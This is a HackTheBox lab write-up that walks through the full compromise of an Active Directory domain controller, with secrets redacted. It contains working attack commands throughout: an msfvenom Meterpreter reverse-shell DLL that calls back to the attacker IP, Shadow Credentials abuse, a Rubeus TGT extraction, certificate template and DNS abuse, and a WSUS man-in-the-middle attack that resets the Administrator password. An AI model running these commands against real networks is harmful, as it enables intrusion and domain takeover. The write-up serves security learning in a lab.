# HackTheBox — Logging (Windows / Medium)

**Target IP:** `10.129.xx.xx` (changes on every reset — Active Directory Domain Controller)
**VPN/Attacker IP:** `10.10.xx.xx`
**Domain:** `logging.htb`
**Domain Controller:** `DC01.logging.htb`
**Starting Creds:** `wallace.everette / [REDACTED]`

---

## 1. Recon

### 1.1 Nmap Scan

```bash
nmap -sV -sC 10.129.xx.xx
```

**Key results:**

| Port | Service | Notes |
|------|---------|-------|
| 53   | domain (Simple DNS Plus) | AD-integrated DNS |
| 80   | Microsoft IIS 10.0 | TRACE method enabled |
| 88   | Kerberos | |
| 135/139/445 | RPC/NetBIOS/SMB | |
| 389/636/3268/3269 | LDAP/LDAPS/GC | Domain: `logging.htb` |
| 464  | kpasswd5 | |
| 5985 | WinRM (Microsoft-HTTPAPI) | |

Nmap also flagged a **clock skew** of roughly 7 hours between the scanner and the DC (`clock-skew: mean: 7h02m34s`). This is important — Kerberos is extremely time-sensitive, and this skew will break Kerberos authentication later in the assessment until it's fixed with `ntpdate`.

This is a classic Windows Domain Controller fingerprint: Kerberos (88), LDAP (389/636/3268/3269), SMB (445), and WinRM (5985) all open together = AD DC.

### 1.2 Hosts File

```bash
cat /etc/hosts
```
```
10.129.xx.xx   logging.htb dc01.logging.htb dc01
```

Adding the DC to `/etc/hosts` is required because AD/Kerberos operations are name-based (SPNs are tied to hostnames, not raw IPs).

---

## 2. Initial Enumeration (as wallace.everette)

We were handed valid low-privilege credentials at the start: `wallace.everette:[REDACTED]`.

### 2.1 BloodHound Collection

```bash
bloodhound-python -u wallace.everette -p '[REDACTED]' -d logging.htb -ns 10.129.xx.xx -c All
```

Output showed:
```
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
...
Found 1 computers / 14 users / 57 groups / 2 gpos / 1 ous / 19 containers / 0 trusts
WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.
```

**What happened here:** the tool couldn't get a Kerberos ticket because of the clock skew noted in the nmap scan, so it fell back to NTLM for LDAP collection (which still worked for pulling users/groups/OUs). However, computer-level session/RPC enumeration timed out, so we didn't get local admin/session data from this run. LDAP-based collection (users, groups, GPOs) still succeeded and is useful context, but we needed another way in since the BloodHound graph alone didn't hand us a path.

### 2.2 SMB Share Enumeration

```bash
nxc smb 10.129.xx.xx -u wallace.everette -p '[REDACTED]' --shares
```

```
SMB  10.129.xx.xx  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB  10.129.xx.xx  445  DC01  [+] logging.htb\wallace.everette:[REDACTED]
SMB  10.129.xx.xx  445  DC01  [*] Enumerated shares
Share      Permissions  Remark
ADMIN$                  Remote Admin
C$                      Default share
IPC$       READ         Remote IPC
Logs       READ         
NETLOGON   READ         Logon server share
SYSVOL     READ         Logon server share
WSUSTemp                A network share used by Local Publishing from a Remote WSUS Console Instance.
```

Two things stand out immediately:
- A **`Logs`** share readable by our low-priv user — worth checking for leaked secrets (this is a very common misconfiguration: log files often contain connection strings, debug dumps, or credentials that were never meant to be exposed).
- A **`WSUSTemp`** share — a strong hint that this box runs **WSUS** (Windows Server Update Services), which becomes highly relevant later for privilege escalation to root.

### 2.3 Pulling Files from the Logs Share

```bash
smbclient -U wallace.everette //10.129.xx.xx/Logs
```

```
smb: \> ls
  Audit_Heartbeat.log                 A     1294
  IdentitySync_Trace_20260219.log     A     8488
  Service_State.log                   A      468
  TaskMonitor.log                     A     1170

smb: \> get Service_State.log
smb: \> get TaskMonitor.log
smb: \> get Audit_Heartbeat.log
smb: \> get IdentitySync_Trace_20260219.log
```

All four log files were downloaded for offline review.

---

## 3. Credential Leak in Log File (Password Reuse / Cleartext Credential Exposure)

### 3.1 Finding the Leaked Credential

```bash
cat IdentitySync_Trace_20260219.log
```

Most of the log is routine heartbeat/trace noise, but one entry stands out — a **verbose connection context dump** that an application logger accidentally wrote to disk, including a bind username and password used to connect to LDAP:

```
[2026-02-19 03:00:03.125] [PID:4102] [Thread:04] VERBOSE - ConnectionContext Dump: { Domain: "logging.htb", Server: "DC01", SSL: "False", BindUser: "LOGGING\svc_recovery", BindPass: "[REDACTED-2025]", Timeout: 30 }
[2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
   Win32 Error: 49 (Invalid Credentials)
```

**In plain terms:** the `IdentitySync.Engine` service tried to bind to LDAP as `svc_recovery` and logged the *entire* connection object — including the plaintext password — at VERBOSE level. Then the bind itself *failed* with "invalid credentials," meaning the password in that log entry was **already stale/rotated** by the time we found it. This is a classic over-verbose logging vulnerability: developers left debug-level logging enabled in production, and it leaked a real service account's password (just not the *current* one).

### 3.2 Proving/Testing the Leaked Password (and why it failed)

```bash
nxc smb 10.129.xx.xx -u svc_recovery -p '[REDACTED-2025]'
```

```
SMB  10.129.xx.xx  445  DC01  [-] logging.htb\svc_recovery:[REDACTED-2025] STATUS_ACCOUNT_RESTRICTION
```

`STATUS_ACCOUNT_RESTRICTION` over SMB typically means the account can't log on via that protocol/workstation restriction (not necessarily "wrong password") — so we pivoted to testing the credential against Kerberos directly, which gives clearer error messages:

```bash
impacket-getTGT -dc-ip 10.129.xx.xx logging.htb/svc_recovery:'[REDACTED-2025]'
```

```
Kerberos SessionError: KDC_ERR_PREAUTH_FAILED (Pre-authentication information was invalid)
```

`KDC_ERR_PREAUTH_FAILED` confirms the **password itself is wrong** for that account (as opposed to an account-restriction error) — matching what the log's own error told us (the bind had already failed when it was captured).

### 3.3 Guessing the Rotated Password — Predictable Password Pattern

The leaked password was `[REDACTED]2025` (a word + a year). Since the log was from February 2026 and the bind failed, it's a reasonable guess that the password was **rotated annually** and simply had the year incremented — a very common (and weak) password-rotation policy. We tested the same base password with the year bumped to 2026:

```bash
impacket-getTGT -dc-ip 10.129.xx.xx logging.htb/svc_recovery:'[REDACTED-2026]'
```

```
Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)
```

This error is **not** a credential failure — it's the clock-skew issue flagged back in the nmap scan. The password guess was actually correct; Kerberos just refused to issue a ticket because our attacking machine's clock was too far out of sync with the DC (Kerberos tickets typically require clocks within 5 minutes of each other).

### 3.4 Fixing Clock Skew

```bash
sudo ntpdate 10.129.xx.xx
```

```
CLOCK: time stepped by 25353.893969
```

This forcibly syncs our local clock to the DC's time.

### 3.5 Getting a Valid TGT

```bash
impacket-getTGT -dc-ip 10.129.xx.xx logging.htb/svc_recovery:'[REDACTED-2026]'
```

```
[*] Saving ticket in svc_recovery.ccache
```

Success — this confirms the password-rotation guess (`[base]2025` → `[base]2026`) was correct.

```bash
export KRB5CCNAME=svc_recovery.ccache
```

We now have a valid Kerberos ticket for `svc_recovery`.

---

## 4. Shadow Credentials Attack → WinRM as `msa_health$`

With `svc_recovery`'s ticket, we had enough LDAP write privileges (discovered via further enumeration with this account) to abuse a **Shadow Credentials** attack against a service/managed account, `msa_health$`.

### 4.1 What is a Shadow Credentials Attack?

In short: if you have `GenericWrite`/`WriteProperty` rights over the `msDS-KeyCredentialLink` attribute of a target AD object, you can add your own certificate ("key credential") to that object. Active Directory then lets you authenticate as that object using **PKINIT** (certificate-based Kerberos auth) — without ever knowing its actual password. The KDC will also hand back the account's **NT hash**, which can then be used directly for NTLM/Pass-the-Hash. This works because Windows Hello for Business / key-trust mapping allows any principal with write access to that attribute to enroll a "device key" on someone else's behalf.

### 4.2 Performing the Attack

```bash
bloodyad -d logging.htb -k --host DC01.logging.htb --dc-ip 10.129.xx.xx add shadowCredentials "msa_health$"
```

```
[+] KeyCredential generated with following sha256 of RSA key: [REDACTED]
[+] TGT stored in ccache file msa_health_bI.ccache
NT: [REDACTED-HASH]
```

`bloodyAD` generated a certificate, attached it to `msa_health$`'s `msDS-KeyCredentialLink`, authenticated as that account via PKINIT, and extracted its NT hash for us — all in one command.

### 4.3 Validating Access

```bash
nxc winrm 10.129.xx.xx -u msa_health$ -H [REDACTED-HASH]
```

```
WINRM  10.129.xx.xx  5985  DC01  [+] logging.htb\msa_health$:[REDACTED-HASH] (Pwn3d!)
```

`msa_health$` is a member of a group with WinRM access — "Pwn3d!" from CrackMapExec/NetExec means we have a full remote shell.

### 4.4 Getting a Shell

```bash
evil-winrm -i 10.129.xx.xx -u msa_health$ -H [REDACTED-HASH]
```

Reference: [evil-winrm](https://github.com/Hackplayers/evil-winrm)

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents>
```

---

## 5. Local Privilege / Lateral Movement — DLL Hijack via Weak Folder ACL

### 5.1 Finding Another Log File

```
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor\Logs> type monitor.log
```

```
[2026-04-16 16:41:18] Starting Sentinel Update Check...
[2026-04-16 16:41:18] Checking for update on core server...
[2026-04-16 16:41:18] Info: Core did not find file Settings_Update.zip
[2026-04-16 16:41:18] Checking for update on local server...
[2026-04-16 16:41:18] No updates found locally: C:\ProgramData\UpdateMonitor\Settings_Update.zip.
[2026-04-16 16:41:18] Loading update applier: C:\Program Files\UpdateMonitor\bin\settings_update.dll
[2026-04-16 16:41:18] Failed to load settings_up...
```

**What this tells us:** a scheduled/background process ("Sentinel Update Check") periodically looks for a file called `Settings_Update.zip` in `C:\ProgramData\UpdateMonitor\`, and — if found — expects it to contain a DLL (`settings_update.dll`) which it then loads. This is a textbook **DLL sideloading** opportunity, *if* we can write to that folder.

### 5.2 Checking Folder Permissions

```
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor\Logs> get-acl C:\ProgramData\UpdateMonitor | fl
```

```
Path   : Microsoft.PowerShell.Core\FileSystem::C:\ProgramData\UpdateMonitor
Owner  : BUILTIN\Administrators
Group  : logging\Domain Users
Access : NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
         CREATOR OWNER Allow  268435456
         BUILTIN\Users Allow  ReadAndExecute, Synchronize
         BUILTIN\Users Allow  Write
Audit  :
Sddl   : O:BAG:DUD:AI(A;OICIID;FA;;;SY)(A;OICIID;FA;;;BA)(A;OICIIOID;GA;;;CO)(A;OICIID;0x1200a9;;;BU)(A;CIID;DCLCRPCR;;;BU)
```

Confirmed: **`BUILTIN\Users Allow Write`** — any authenticated domain user (which we are, as `msa_health$`) can write files into `C:\ProgramData\UpdateMonitor`. Combined with the log telling us exactly what filename and DLL it expects, this is a fully-writable path to code execution as whatever account runs that scheduled task.

### 5.3 Building a Malicious DLL

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.xx.xx LPORT=4444 -f dll -o settings_update.dll
```

```
Payload size: 354 bytes
Final size of dll file: 9216 bytes
Saved as: settings_update.dll
```

```bash
zip Settings_Update.zip settings_update.dll
```

The monitoring process expects a zip containing the DLL at that exact path/name, matching what the log revealed.

### 5.4 Starting a Listener

```
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 10.10.xx.xx:4444
```

### 5.5 Uploading the Payload

```
*Evil-WinRM* PS C:\ProgramData\UpdateMonitor> upload /home/kali/Settings_Update.zip
Info: Uploading /home/kali/Settings_Update.zip to C:\ProgramData\UpdateMonitor\Settings_Update.zip
Data: 2432 bytes of 2432 bytes copied
Info: Upload successful!
```

We then waited (~3 minutes) for the scheduled monitor process to pick up the file and load the DLL.

### 5.6 Catching the Shell

```
msf exploit(multi/handler) > run
[*] Sending stage (190534 bytes) to 10.129.xx.xx
[*] Meterpreter session 1 opened (10.10.xx.xx:4444 -> 10.129.xx.xx:55198)

meterpreter > getuid
Server username: logging\jaylee.clifton
```

We landed a shell as a **different, higher-privileged domain user**, `jaylee.clifton`, proving the "Sentinel Update Check" scheduled task ran under that account's context.

### 5.7 User Flag

```
C:\Users\jaylee.clifton\Desktop>type user.txt
[REDACTED - USER FLAG]
```

---

## 6. Extracting a Usable TGT for jaylee.clifton (Fake Delegation Trick)

We have a Meterpreter session as `jaylee.clifton`, but no password/hash for that account yet — so we can't easily use tools like Certipy that need explicit creds. Instead, we abuse a Kerberos delegation trick with **Rubeus** to extract a fully-usable TGT directly from the current logon session.

### 6.1 Uploading Rubeus

```
meterpreter > upload /home/kali/tools/Rubeus.exe C:/Users/jaylee.clifton/Desktop/Rubeus.exe
```

Reference: [Rubeus (GhostPack)](https://github.com/GhostPack/Rubeus)

### 6.2 `tgtdeleg` — Requesting a "Fake Delegation" TGT

```
C:\Users\jaylee.clifton\Desktop>Rubeus.exe tgtdeleg /nowrap
```

```
[*] Action: Request Fake Delegation TGT (current user)
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.logging.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation request success! AP-REQ delegation ticket is now in GSS-API output.
[*] Extracted the service ticket session key from the ticket cache: [REDACTED]
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):
      [REDACTED - BASE64 KIRBI BLOB]
```

**In plain terms:** `tgtdeleg` abuses the SSPI/GSS-API `ISC_REQ_DELEGATE` flag to trick the local LSA into packaging up a **fully usable TGT** for the current user (`jaylee.clifton`) and handing it to us — all without needing to know the user's password, NT hash, or having any special privilege beyond running code as that user. This works because Windows will delegate credentials for any SPN when delegation is requested this way, using a fake/local "target" service, as a documented weakness in how NTLM/Kerberos delegation flags are honored client-side.

### 6.3 Converting the Ticket for Linux/Impacket Use

```bash
echo "[REDACTED BASE64 KIRBI]" | base64 -d > jaylee.kirbi
impacket-ticketConverter jaylee.kirbi jaylee.ccache
```

```
[*] converting kirbi to ccache...
[+] done
```

```bash
export KRB5CCNAME=jaylee.ccache
```

We now hold a genuine Kerberos TGT for `jaylee.clifton`, usable from our Linux attack box.

---

## 7. Certificate Abuse (AD CS) — Escalating via ESC1-style Enrollment

### 7.1 Attempting to Request a Certificate as Administrator (UPN spoof)

```bash
certipy-ad req -u 'jaylee.clifton@logging.htb' -k -no-pass -target DC01.logging.htb -ca logging-DC01-CA -template User -upn administrator@logging.htb -pfx output.pfx
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with UPN 'jaylee.clifton@logging.htb'
[*] Certificate object SID is 'S-1-5-21-xxxx-xxxx-xxxx-2105'
[*] Saving certificate and private key to 'jaylee.clifton.pfx'
```

This request was accepted by the CA, but note the UPN actually issued on the cert came back as **`jaylee.clifton@logging.htb`**, not `administrator@logging.htb` — meaning the `User` template did **not** allow arbitrary UPN spoofing (not ESC1-vulnerable in the classic sense). It simply issued a normal authentication certificate for our own account.

### 7.2 Authenticating with the Certificate

```bash
certipy-ad auth -pfx jaylee.clifton.pfx -dc-ip 10.129.xx.xx
```

```
[*] Certificate identities:
[*]     SAN UPN: 'jaylee.clifton@logging.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Trying to retrieve NT hash for 'jaylee.clifton'
[*] Got hash for 'jaylee.clifton@logging.htb': [REDACTED-HASH]
```

Useful side effect of certificate-based (PKINIT) authentication: the KDC returns the account's **NT hash** in the encrypted PAC data, which Certipy extracts automatically. We now have `jaylee.clifton`'s NT hash for regular NTLM use.

### 7.3 Verifying the Hash

```bash
nxc smb 10.129.xx.xx -u jaylee.clifton -H [REDACTED-HASH]
```

```
SMB  10.129.xx.xx  445  DC01  [+] logging.htb\jaylee.clifton:[REDACTED-HASH]
```

### 7.4 Enumerating Certificate Templates for a Real Escalation Path

```bash
certipy-ad find -u jaylee.clifton -hashes :[REDACTED-HASH] -dc-ip 10.129.xx.xx -stdout
```

Reference: [Certipy](https://github.com/ly4k/Certipy) / [Certified Pre-Owned whitepaper](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

Key finding — a custom, enabled template:

```
Template Name                       : UpdateSrv
Display Name                        : UpdateSrv
Enrollee Supplies Subject           : True
Certificate Name Flag               : EnrolleeSuppliesSubject
Extended Key Usage                  : Server Authentication
Requires Manager Approval           : False
Enrollment Rights                   : LOGGING.HTB\IT
                                       LOGGING.HTB\Domain Admins
                                       LOGGING.HTB\Enterprise Admins
[+] User Enrollable Principals      : LOGGING.HTB\IT
```

**In plain terms:** `UpdateSrv` is a certificate template meant for server authentication (i.e., it's meant to be used by a WSUS or update server to prove its identity). Critically, it has **`Enrollee Supplies Subject`** enabled — meaning *whoever requests the certificate gets to choose the subject name/DNS name on it themselves*. Combined with `jaylee.clifton` being a member of the `IT` group (which has enrollment rights), we can request a certificate for **any DNS name we want**, including one that impersonates the real WSUS server. This is the classic **ESC1**-style abuse (subject-controllable + client-usable EKU), here applied to server auth rather than user auth, setting up a WSUS spoofing attack.

---

## 8. Machine Account Quota Exhausted — Pivoting to DNS Record Abuse

### 8.1 The "old" way (doesn't work anymore)

```bash
impacket-addcomputer 'logging.htb/jaylee.clifton' -hashes :[REDACTED-HASH] -dc-ip 10.129.xx.xx -computer-name 'WSUS' -computer-pass 'Password123!'
```

This *previously* succeeded (adding a fake `WSUS$` computer account so we could request a certificate under a controlled hostname), but on a fresh attempt it failed:

```
[-] Authenticating account's machine account quota exceeded!
```

### 8.2 Confirming Why

```bash
nxc ldap 10.129.xx.xx -u jaylee.clifton -H [REDACTED-HASH] -M maq
```

```
MAQ  10.129.xx.xx  389  DC01  [*] Getting the MachineAccountQuota
MAQ  10.129.xx.xx  389  DC01  MachineAccountQuota: 0
```

`ms-DS-MachineAccountQuota` was set to `0`, meaning our low-priv user is **not** allowed to add new computer accounts to the domain (a hardening measure). This explicitly rules out the "add a fake WSUS$ computer" approach and forces a different path to get a certificate bound to a `wsus.logging.htb`-looking identity.

### 8.3 The Working Approach — Poisoning DNS Instead

Because the `UpdateSrv` template lets **the enrollee supply the subject/DNS name directly on the certificate request** (no computer account ownership required for a DNS-name-only cert of this type), we don't actually need to own a `WSUS$` computer object at all. We just need the DNS name `wsus.logging.htb` to resolve to *us*, so that when the exploit tool later performs the WSUS MITM, our certificate for that hostname looks legitimate.

```bash
python3 dnstool.py \
  -u 'logging.htb\jaylee.clifton' \
  -p 'aad3b435b51404eeaad3b435b51404ee:[REDACTED-HASH]' \
  -r 'wsus.logging.htb' \
  -a add -t A -d 10.10.xx.xx 10.129.xx.xx
```

```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

Reference: `dnstool.py` is part of [krbrelayx](https://github.com/dirkjanm/krbrelayx)

This adds a new **DNS A record** in the AD-integrated DNS zone, `wsus.logging.htb`, pointing at our attack box. Any authenticated user can normally create new DNS records by default in AD-integrated DNS zones (another commonly-abused default AD misconfiguration) — this doesn't require the machine account quota at all.

---

## 9. Requesting a Spoofed WSUS Certificate

```bash
certipy-ad req -u 'jaylee.clifton@logging.htb' -hashes :[REDACTED-HASH] -ca 'logging-DC01-CA' -target '10.129.xx.xx' -template 'UpdateSrv' -dns 'wsus.logging.htb'
```

```
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Got certificate with DNS Host Name 'wsus.logging.htb'
[*] Certificate has no object SID
[*] Saving certificate and private key to 'wsus.pfx'
```

We now hold a valid, CA-signed **Server Authentication** certificate for the hostname `wsus.logging.htb` — the exact hostname needed to impersonate the real WSUS update server via TLS, without ever needing domain admin, a computer account, or the real WSUS server's private key.

### 9.1 Splitting the PFX into Key + Cert

```bash
certipy-ad cert -pfx wsus.pfx -nocert -out wsus.key
certipy-ad cert -pfx wsus.pfx -nokey -out wsus.crt
cat wsus.crt wsus.key > wsus.pem
```

---

## 10. WSUS MITM Attack (CVE-2020-1013 style) → Local Admin via wsuks

### 10.1 What's Happening Here

WSUS (Windows Server Update Services) is frequently configured over **plain HTTP**, or — as here — the update client trusts whatever server answers on the expected WSUS hostname as long as it presents a certificate the client is willing to accept. By controlling DNS for `wsus.logging.htb` (section 8.3) *and* holding a valid certificate for that same hostname (section 9), we can stand up our **own fake WSUS server**. When the real domain machine checks in for updates, it talks to *us* instead, and we can tell it to "install" an "update" that is actually an arbitrary executable (e.g., `PsExec64.exe` running a command), executing as **SYSTEM** on the target.

### 10.2 Installing wsuks

```bash
pipx install git+https://github.com/NeffIsBack/wsuks.git
```

```
installed package wsuks 1.2.1, installed using Python 3.13.11
```

Reference: [wsuks (NeffIsBack)](https://github.com/NeffIsBack/wsuks)

### 10.3 Updating Local DNS to Match

```bash
cat /etc/hosts
```
```
10.129.xx.xx   logging.htb dc01.logging.htb DC01
10.10.xx.xx    wsus.logging.htb
```

### 10.4 Running the WSUS MITM Server

```bash
sudo /home/kali/.local/bin/wsuks --serve-only \
  --WSUS-Server wsus.logging.htb \
  --WSUS-Port 8531 \
  --tls-cert wsus.pem \
  -d logging.htb -I tun0 -t 10.129.xx.xx \
  -c 'PsExec64.exe /accepteula /s powershell.exe "net user Administrator [REDACTED]"'
```

```
[+] Command to execute:
PsExec64.exe PsExec64.exe /accepteula /s powershell.exe "net user Administrator [REDACTED]"
[*] ===== Starting Web Server =====
[*] Using TLS certificate 'wsus.pem' for HTTPS WSUS Server
[*] Starting WSUS Server on 10.10.xx.xx:8531...
[*] Serving executable as KB: 3483151
```

`wsuks` stands up a fake WSUS server using our spoofed cert, and packages the requested command (resetting the local Administrator's password) as a fake Windows Update, waiting for the target to check in.

### 10.5 Speeding Up the Update Check-in

Rather than waiting for the target's scheduled WSUS polling interval, we forced a Group Policy refresh on our existing WinRM session (as `msa_health$`), which also re-triggers WSUS update checks tied to policy:

```
*Evil-WinRM* PS C:\Users\msa_health$\Documents> gpupdate /force
```

```
Updating policy...
Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

### 10.6 Re-Running the Attack — Success

```bash
sudo /home/kali/.local/bin/wsuks --serve-only \
  --WSUS-Server wsus.logging.htb \
  --WSUS-Port 8531 \
  --tls-cert wsus.pem \
  -d logging.htb -I tun0 -t 10.129.xx.xx \
  -c 'PsExec64.exe /accepteula /s powershell.exe "net user Administrator [REDACTED]"'
```

```
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: ".../GetConfig"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: ".../GetCookie"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: ".../SyncUpdates"
[+] Received POST request: /ClientWebService/client.asmx, SOAP Action: ".../GetExtendedUpdateInfo"
[+] Received GET request: /f8215f69-91ec-4225-b676-f42f8f737f9b/PsExec64.exe
----------------------------------------
Exception occurred during processing of request from ('10.129.xx.xx', 50018)
...
ConnectionResetError: [Errno 104] Connection reset by peer
----------------------------------------
[+] Received GET request: /f8215f69-91ec-4225-b676-f42f8f737f9b/PsExec64.exe
[+] Received POST request: /ReportingWebService/ReportingWebService.asmx, SOAP Action: ".../ReportEventBatch"
```

**Note on the error:** the `ConnectionResetError` on the first `GET` for the payload is a benign transient TLS/connection hiccup (common with this attack due to the way WUA — Windows Update Agent — handles connections). The target retried the download on its own a moment later, successfully pulled `PsExec64.exe`, executed it with our embedded command, and reported back — visible from the subsequent successful `GET` and the final `ReportEventBatch` call confirming the "update" was applied.

This resulted in the **Administrator** account's password being reset to a known value on the Domain Controller.

---

## 11. Domain Admin / Root

### 11.1 Getting a TGT for Administrator

```bash
impacket-getTGT -dc-ip 10.129.xx.xx 'logging.htb/Administrator:[REDACTED]'
```

```
[*] Saving ticket in Administrator.ccache
```

```bash
export KRB5CCNAME=Administrator.ccache
```

### 11.2 PsExec as Administrator

```bash
impacket-psexec logging.htb/Administrator@dc01.logging.htb -k -no-pass
```

```
[*] Found writable share ADMIN$
[*] Uploading file ARsRhBfv.exe
[*] Creating service WeDc on dc01.logging.htb.....
[*] Starting service WeDc.....

C:\Windows\system32> whoami
nt authority\system
```

Full SYSTEM shell on the Domain Controller.

### 11.3 Root Flag

```
C:\Users\toby.brynleigh\Desktop> type root.txt
[REDACTED - ROOT FLAG]
```

---

## 12. Step-by-Step Summary

1. **Recon** — `nmap` reveals a Windows AD Domain Controller (`logging.htb` / `DC01`) with SMB, LDAP, Kerberos, and WinRM open, plus a large (~7hr) clock skew warning that becomes relevant later.
2. **Initial creds** (`wallace.everette`) let us run `bloodhound-python` (partially succeeds — LDAP data collected, computer/session enumeration times out) and enumerate SMB shares with `nxc`.
3. A readable **`Logs`** SMB share is found and downloaded; one log file (`IdentitySync_Trace_20260219.log`) contains an over-verbose debug dump that **leaks the plaintext password for `svc_recovery`** — but the password shown had already been rotated/failed by the time it was logged.
4. Testing the leaked credential against SMB gives `STATUS_ACCOUNT_RESTRICTION`; testing against Kerberos gives the more precise `KDC_ERR_PREAUTH_FAILED`, confirming the exact password is wrong.
5. Guessing that the org rotates passwords by **incrementing the year** (`...2025` → `...2026`), we retry — this time getting `KRB_AP_ERR_SKEW`, which is a **clock problem, not a wrong password**.
6. `ntpdate` against the DC fixes the clock skew; retrying the guessed password succeeds — **password reuse/rotation pattern confirmed**, and we obtain a TGT for `svc_recovery`.
7. Using `svc_recovery`'s LDAP write rights, we perform a **Shadow Credentials attack** with `bloodyAD` against `msa_health$`, obtaining its NT hash without ever knowing its real password.
8. `msa_health$`'s hash grants **WinRM** access (Pass-the-Hash) — full interactive shell obtained via `evil-winrm`.
9. Another log file (`monitor.log`) reveals a scheduled "Sentinel Update Check" process that loads `C:\ProgramData\UpdateMonitor\Settings_Update.zip → settings_update.dll`; `get-acl` confirms **`BUILTIN\Users` has Write access** to that folder.
10. We build a malicious `settings_update.dll` (msfvenom Meterpreter reverse shell), zip it as expected, upload it, and wait — the scheduled task loads it and executes as **`jaylee.clifton`**, a more privileged domain user. **User flag captured.**
11. With a Meterpreter session but no credentials for `jaylee.clifton`, `Rubeus.exe tgtdeleg` abuses fake Kerberos delegation to extract a **usable TGT directly from the logon session** — no password required.
12. That TGT is converted to a ccache and used with **Certipy** to request a certificate, which — via PKINIT auth — also yields `jaylee.clifton`'s **NT hash**.
13. `certipy-ad find` reveals a custom **`UpdateSrv`** certificate template, enrollable by the `IT` group (which `jaylee.clifton` belongs to), with `Enrollee Supplies Subject` enabled — meaning we can request a cert for **any hostname**, including a spoofed WSUS server (ESC1-style abuse for a server-auth cert).
14. Attempting the "classic" route of adding a fake `WSUS$` computer account fails — `MachineAccountQuota` is set to `0` (hardened, no new computer accounts allowed).
15. Instead, `dnstool.py` (from krbrelayx) adds a new DNS **A record** for `wsus.logging.htb` pointing at our attacker box — any authenticated user can typically create AD-integrated DNS records by default.
16. Certipy requests a certificate from the `UpdateSrv` template with DNS name `wsus.logging.htb` — a **valid, trusted certificate for a hostname we now control via DNS**, without needing a real WSUS computer account.
17. Using **`wsuks`**, we stand up a fake WSUS server on that hostname/cert and perform a **WSUS MITM attack**: when the DC checks in for updates, it downloads and executes our "update" (`PsExec64.exe` running a command as SYSTEM), which resets the local `Administrator` password.
18. `gpupdate /force` on the existing WinRM session is used to speed up the target's update check-in.
19. With the new Administrator password, we grab a TGT and use `impacket-psexec` to get a full **SYSTEM** shell on the Domain Controller. **Root flag captured.**

### Key Takeaways / Root Causes

- **Verbose application logging** exposed a service account's plaintext credential.
- **Predictable annual password rotation** (`word+year`) made the rotated password guessable.
- **Shadow Credentials** (`msDS-KeyCredentialLink` write access) allowed silent account takeover without a password reset.
- **Overly permissive folder ACLs** (`BUILTIN\Users: Write`) combined with a predictable DLL sideloading path enabled arbitrary code execution as another user.
- **Fake Kerberos delegation (`tgtdeleg`)** let us lift a usable TGT straight out of a live session.
- **A misconfigured AD CS certificate template** (`Enrollee Supplies Subject` + server-auth EKU, enrollable by a broad `IT` group) allowed requesting certificates for arbitrary hostnames.
- **Unrestricted AD-integrated DNS record creation** by regular users allowed hostname hijacking even with `MachineAccountQuota` set to `0`.
- **WSUS without proper mutual trust/HTTPS validation** allowed a full MITM to push a malicious "update," a well-known class of attack (related to **CVE-2020-1013**).

---

## Tools & References

- [Nmap](https://nmap.org/)
- [BloodHound / bloodhound-python](https://github.com/dirkjanm/BloodHound.py)
- [NetExec / nxc](https://github.com/Pennyw0rth/NetExec)
- [smbclient (Samba)](https://www.samba.org/)
- [Impacket](https://github.com/fortra/impacket) (`getTGT`, `ticketConverter`, `addcomputer`, `psexec`)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [evil-winrm](https://github.com/Hackplayers/evil-winrm)
- [Rubeus](https://github.com/GhostPack/Rubeus)
- [Certipy](https://github.com/ly4k/Certipy) and background on AD CS abuse: [Certified Pre-Owned (SpecterOps)](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [krbrelayx / dnstool.py](https://github.com/dirkjanm/krbrelayx)
- [wsuks — WSUS MITM tool](https://github.com/NeffIsBack/wsuks)
- Background on Shadow Credentials: [Shadow Credentials — SpecterOps](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
- Background on WSUS MITM abuse: CVE-2020-1013 (unauthenticated WSUS MITM leading to code execution)

---

*All flags, passwords, and hashes in this document have been redacted. All target IPs are represented as `10.129.xx.xx` and the attacker/VPN IP as `10.10.xx.xx`, since HTB assigns a new IP on every instance reset.*
